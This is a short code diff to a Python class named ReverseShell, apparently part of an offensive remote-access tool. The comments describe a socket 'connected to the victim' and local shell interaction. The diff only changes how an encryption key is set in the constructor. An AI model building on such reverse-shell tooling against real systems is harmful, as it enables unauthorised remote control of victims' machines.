@@ -21,13 +21,12 @@ class ReverseShell(threading.Thread):
     SHELL_HELLO = bytes([0x21, 0x9e, 0x10, 0x55, 0x75, 0x6a, 0x1a, 0x6b])
     signal_pipe = os.pipe()
 
-    def __init__(self, sock, key=None):
+    def __init__(self, sock):
         super(ReverseShell, self).__init__()
         self.key = get_secret_key()
         self.details = {}
         self.rsock = sock  # the remote socket connected to the victim
         self.lsock = None  # the local socket for shell interaction
-        self.key = key
         self.log = []
         self.active = False
         if self.get_shell_hello():
